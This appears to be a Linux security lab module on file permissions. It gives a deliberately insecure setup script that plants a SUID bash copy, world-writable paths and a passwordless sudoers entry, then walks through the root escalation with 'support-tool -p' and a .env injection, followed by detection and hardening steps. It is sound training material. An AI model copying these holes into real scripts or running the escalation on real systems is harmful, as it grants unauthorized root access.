# Phase 01 — Linux Deep Internals | Session 02 of 12

## Topic
File permissions: DAC, setuid/setgid, sticky bit

## Session Goal
Build the attacker's reflex to spot SUID binaries, world-writable paths, and sudo misconfigurations as privilege escalation stepping stones — not just misconfigurations to note and move on.

## The Artifact
A shell script (`setup-env.sh`) that a developer wrote to "quickly stand up a deployment environment." It creates directories, installs a support tool, and configures sudo. Every decision in it is wrong from a security standpoint. Your job is to run it in a test environment (a fresh VM or an unprivileged Docker container with `--privileged`), then switch to a `www-data` account and determine how far you can escalate privilege from there.

The script does four things: copies `/bin/bash` to a known path and sets the SUID bit on it, creates world-writable shared directories, makes a world-writable `.env` file, and adds a broad passwordless sudo entry. None of these are individually unusual in real deployment scripts — which is exactly the problem.

```bash
#!/bin/bash
# setup-env.sh — sets up a "deployment environment"
mkdir -p /opt/app /opt/shared /tmp/uploads
cp /bin/bash /opt/app/support-tool
chmod 4755 /opt/app/support-tool        # SUID bash copy
chmod 777 /opt/shared                   # world-writable shared dir
chmod 777 /tmp/uploads                  # world-writable uploads
echo "deploy ALL=(ALL) NOPASSWD: /opt/app/support-tool" >> /etc/sudoers
touch /opt/shared/.env
chmod 666 /opt/shared/.env             # world-writable env file
```

Run this as root. Then switch to `www-data` (or any low-privilege user) and treat the system as an attacker would.

## Background (read after attempting the artifact)
- **DAC (Discretionary Access Control):** Linux's standard permission model. Every file has an owner, group, and three permission triplets (rwx for owner, group, world). "Discretionary" means the file owner controls access — there is no mandatory policy unless you layer SELinux/AppArmor on top. DAC is the first thing an attacker probes.
- **setuid (SUID) bit:** When set on an executable, the process runs with the *file owner's* UID rather than the calling user's UID. If root owns `/opt/app/support-tool` and SUID is set, any user who executes it gets a process running as root. This is intentional for things like `passwd` (which needs to write `/etc/shadow`) but catastrophic when applied to a shell binary.
- **The `-p` flag on bash:** By default, bash drops privileges when it detects it was launched with SUID. The `-p` flag (privileged mode) disables that drop. `/opt/app/support-tool -p` therefore gives you a root shell regardless of who ran it.
- **World-writable paths and `.env` files:** A file with mode `666` can be read and written by any user on the system. An `.env` file typically contains database credentials, API keys, or service account tokens. An attacker who can write to it can inject environment variables that get picked up by the application on next restart — turning a read access into code execution or credential theft.
- **Sudo misconfiguration (`NOPASSWD: /opt/app/support-tool`):** This entry says: the `deploy` user can run `/opt/app/support-tool` as any user, without a password. Combined with the SUID bit, this is redundant but also independently exploitable — and it demonstrates how two misconfigurations can each independently provide full root access, which means fixing one does not fix the system.

## Exercise

### Step 1 — Set up the environment
Spin up a fresh Ubuntu VM or a Docker container with `--privileged`. Create a `www-data` user if it does not already exist (`useradd -s /bin/bash www-data`). Run `setup-env.sh` as root. Verify the setup with:
```bash
ls -la /opt/app/support-tool
ls -la /opt/shared/
ls -la /opt/shared/.env
sudo -l -U deploy
```
Confirm `support-tool` shows `-rwsr-xr-x` (the `s` in owner-execute position is the SUID bit).

### Step 2 — Attack as www-data
You are a low-privilege web server process that just got compromised. You have a shell as `www-data` — you own nothing, you are nobody. Switch to that account and escalate from there using only what the developer left behind.

```bash
# switch to www-data — this simulates landing as the compromised web user
su - www-data

# scan the entire filesystem for SUID binaries owned by root
# any binary here runs as root regardless of who executes it
# /opt/app/support-tool will appear — that is your escalation path
find / -perm -4000 -user root 2>/dev/null

# run the SUID bash copy in privileged mode
# bash normally drops root when it detects SUID — -p disables that drop
# result: root shell from www-data with no password
/opt/app/support-tool -p

# confirm you are root
id

# read the .env file — world-readable means any user can read it
# in a real system this holds database passwords, API keys, tokens
cat /opt/shared/.env

# write a fake credential into the .env file — world-writable means any user can modify it
# when the app restarts it loads this file and picks up the injected value
echo "DATABASE_PASSWORD=injected-by-attacker" >> /opt/shared/.env
```

### Step 3 — Document and diagnose
You are now the defender — a security auditor who just inherited this server. You have root. Run each command, look at what it returns, and write down the exact proof that each finding is exploitable — not just that it looks suspicious.

```bash
# list every SUID binary on the system — -type f excludes directories
# anything outside /usr/bin and /usr/sbin is a candidate for removal
find / -perm -4000 -type f 2>/dev/null

# find every file any user can write to, skipping /tmp (world-writable by design) and /proc (virtual)
# in a clean system this list should be empty — /opt/shared and /opt/shared/.env will appear here
find / -perm -o+w -not -path "/tmp/*" -not -path "/proc/*" 2>/dev/null

# scan all sudoers files for passwordless entries — every line returned is a root escalation path
# -r searches recursively because rules can be split across files in /etc/sudoers.d/
grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/ 2>/dev/null

# find service accounts that have a real login shell — they should have /usr/sbin/nologin or /bin/false
# a real shell means an attacker who compromises that account gets an interactive session
grep -E ':/bin/bash$|:/bin/sh$' /etc/passwd
```
For each finding, write the specific command that proves it is exploitable — not just that it exists.

## Your Deliverable
Write your findings in `SOLUTION.md` in this folder. For each finding use:
```
## Finding N: [name]
**Line(s)/Location:** ...
**What it is:** ...
**Exploit chain:** attacker does X → which enables Y → end state is Z
**Impact:** ...
**Fix:** ...
```

## Acceptance Criteria

### FUNCTIONAL
- [ ] `setup-env.sh` runs without errors in a test environment
- [ ] `www-data` user exists and can be switched to

### SECURITY
- [ ] SUID exploit documented with exact command sequence and `id` output showing root
- [ ] `.env` injection documented with before/after file content
- [ ] Sudo misconfiguration identified and exploit chain written out (even if `www-data` is not in sudoers, explain the `deploy` user path)
- [ ] Each finding includes full exploit chain, not just a label

### OBSERVABLE
- [ ] `id` output after SUID exploit shows `uid=0(root)`
- [ ] `cat /opt/shared/.env` shows injected content
- [ ] Detection commands from Step 3 are run and output is included in SOLUTION.md

### STRETCH
- [ ] Write a one-liner that finds all SUID binaries on a system, checks each against GTFOBins programmatically, and outputs which ones are exploitable
- [ ] Fix each misconfiguration in the script (`setup-env.sh.hardened`) and explain what the correct permission/configuration should be and why

## Offline Notes
- **GTFOBins** (https://gtfobins.github.io) — searchable list of Unix binaries with SUID, sudo, and other abuse vectors. Bookmark this.
- `stat /opt/app/support-tool` — shows permissions in both symbolic and octal format
- `chmod` octal reference: 4000 = SUID, 2000 = SGID, 1000 = sticky bit. So `4755` = SUID + rwxr-xr-x
- `find / -perm /6000` — finds files with SUID or SGID set (uses OR logic)
- `find / -perm -4000 -user root 2>/dev/null` — finds all root-owned SUID binaries. Breakdown:
  - `find /` — search from filesystem root, every mounted directory
  - `-perm -4000` — match files where SUID bit is set; the `-` prefix means "at least these bits" so it matches `4755`, `4700`, `4777` — anything with SUID on. Without `-` it would only match exact `4000`
  - `-user root` — only files owned by root; SUID on a root-owned file means the process runs as root regardless of who executes it
  - `2>/dev/null` — silence permission errors from `/proc` and `/sys`; keeps output clean, only real results show
  - In output: any binary outside known system utilities (`/usr/bin/passwd`, `/usr/bin/sudo`) is a red flag — `/opt/app/support-tool` appearing here means any user gets a root shell with one command
- `/opt/app/support-tool -p` — exploits the SUID bash copy. Breakdown:
  - `/opt/app/support-tool` — this is just a copy of `/bin/bash` with the SUID bit set and owned by root; executing it would normally give a root process, but bash has a built-in defense: it detects it was launched via SUID and drops privileges back to the calling user automatically
  - `-p` — "privileged mode"; disables that privilege drop; bash keeps the effective UID of the file owner (root) instead of switching back to the caller's UID
  - End result: you get an interactive root shell as any user on the system — no password, no exploit, one command
  - Verify with `id` immediately after — output should show `euid=0(root)`
- The sticky bit (1000) on directories means only the file owner can delete their own files, even in a world-writable directory. Check `/tmp` — it should have sticky set (`drwxrwxrwt`). `/opt/shared` in this artifact does not.
- `visudo` is the safe way to edit sudoers — it validates syntax before saving. Direct `echo >> /etc/sudoers` bypasses this.
- `man 5 passwd`, `man 5 shadow`, `man 8 sudo`, `man 1 find`
- Key `/proc` paths: `/proc/self/status` shows your current capabilities; `/proc/$PID/exe` shows the binary a process is running

## Session Summary Template
```
Session 02 complete.
Covered: [fill in]
Key insight: [fill in]
Gap identified: [fill in]
```
